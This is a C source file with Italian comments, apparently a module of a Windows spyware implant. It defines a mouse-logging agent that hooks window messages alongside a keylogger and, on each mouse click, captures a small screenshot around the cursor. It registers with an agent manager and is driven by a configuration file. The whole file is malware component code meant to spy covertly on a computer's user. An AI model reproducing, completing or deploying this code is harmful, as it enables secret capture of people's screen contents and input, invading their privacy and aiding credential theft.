#include <Windowsx.h>

// XXX Gli hook della PeekMessage e GetMessage sono all'interno di quelli del keylog
#define DEFAULT_MOUSE_X_CAP 40
#define DEFAULT_MOUSE_Y_CAP 40
DWORD mouse_x_cap = 0, mouse_y_cap = 0;

// struttura di configurazione nel file
typedef struct _mouse_conf {
	DWORD mouse_x_cap;
	DWORD mouse_y_cap;
} mouse_conf;

DWORD __stdcall PM_MouseLogDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
{
	int xPos, yPos;
	HWND hwnd = (HWND) dwFlags;

	key_params_struct *key_params; // XXX Definita in HM_KeyLog.h
	key_params = (key_params_struct *)msg;
	
	xPos = GET_X_LPARAM(key_params->lprm); 
	yPos = GET_Y_LPARAM(key_params->lprm); 

	TakeMiniSnapShot(PM_MOUSEAGENT, hwnd, xPos, yPos, mouse_x_cap, mouse_y_cap);

	return 1;
}


DWORD __stdcall PM_MouseLogStartStop(BOOL bStartFlag, BOOL bReset)
{
	// Durante la sync gli agenti continuano a scrivere nella coda.
	// Solo una start/stop esplicita fa cambiare stato agli hook
	if (bReset)
		AM_IPCAgentStartStop(PM_MOUSEAGENT, bStartFlag);
	
	return 1;
}


DWORD __stdcall PM_MouseLogInit(BYTE *conf_ptr, BOOL bStartFlag)
{
	mouse_conf *mouse_conf_ptr = (mouse_conf *)conf_ptr;
	if (mouse_conf_ptr) {
		mouse_x_cap = mouse_conf_ptr->mouse_x_cap;
		mouse_y_cap = mouse_conf_ptr->mouse_y_cap;
	} else {
		mouse_x_cap = DEFAULT_MOUSE_X_CAP;
		mouse_y_cap = DEFAULT_MOUSE_Y_CAP;
	}

	PM_MouseLogStartStop(bStartFlag, TRUE);
	return 1;
}


void PM_MouseLogRegister()
{
	// Non ha nessuna funzione di Dispatch
	AM_MonitorRegister(PM_MOUSEAGENT, (BYTE *)PM_MouseLogDispatch, (BYTE *)PM_MouseLogStartStop, (BYTE *)PM_MouseLogInit, NULL);

	// Inizialmente i monitor devono avere una configurazione di default nel caso
	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
	PM_MouseLogInit(NULL, FALSE);
}